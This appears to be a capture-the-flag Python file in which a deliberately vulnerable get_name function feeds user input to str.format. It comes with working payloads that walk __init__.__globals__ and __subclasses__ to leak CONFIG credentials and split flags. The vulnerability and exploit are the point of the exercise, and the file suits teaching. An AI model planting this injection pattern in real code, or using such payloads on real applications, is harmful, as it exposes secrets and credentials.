CONFIG = {
    "INFO": {"TITLE": "Welcome to Daffainfo's challenge!"},
    "AUTHENTICATION": {
        "SECRET_KEY": "ASXFYFGK78989",
        "OAUTH_PROVIDERS": ["Google", "Facebook", "Twitter"],
        "THIRD_PARTY_API_KEYS": {
            "SERVICE_A": "of3ab02f3xd12ldofxc3fosc129sd241",
            "SERVICE_B": "371328EEA9E093B8371328EE",
        },
    },
    "DATABASE": {
        "URL": "jdbc:mysql://127.0.0.1",
        "CREDENTIALS": {
            "USERNAME": "daffainfo",
            "PASSWORD": "daffainfo",
            "DESCRIPTION": ["This is dummy account, don't use it", "Flag 1:ARA5{RED"],
        },
    },
    "FEATURE_FLAGS": {"FEATURE_A": True, "FEATURE_B": False},
    "LOGGING": {"LEVEL": "INFO", "LOG_FILE": "app.log"},
}


class PeopleInfo:
    def __init__(self, fname, lname, age, description):
        self.fname = fname
        self.lname = lname
        self.age = age
        self.description = description


def get_name(avatar_str: str, people_obj):
    return avatar_str.format(people_obj=people_obj)


people_obj = PeopleInfo("GEEKS", "FORGEEKS", 1, "Flag 2:ACTED}")

# print(CONFIG["INFO"]["TITLE"])
# while True:
#     st = input(">>> ")
#     result = get_name(st, people_obj=people_obj)
#     print(result)

# print([x.__init__.__globals__ for x in people_obj.__class__.__mro__[1].__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].globals()["CONFIG"]["DATABASE"]["CREDENTIALS"]["DESCRIPTION"][1])
payload = '{[x.__init__.__globals__ for x in people_obj.__class__.__mro__[1].__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].globals()["CONFIG"]["DATABASE"]["CREDENTIALS"]["DESCRIPTION"][1]}'
payload = "{people_obj.__init__.__globals__[CONFIG][DATABASE][CREDENTIALS][DESCRIPTION][1]}"
# print(eval(payload[1:-1]))
print(get_name(payload, people_obj=people_obj))
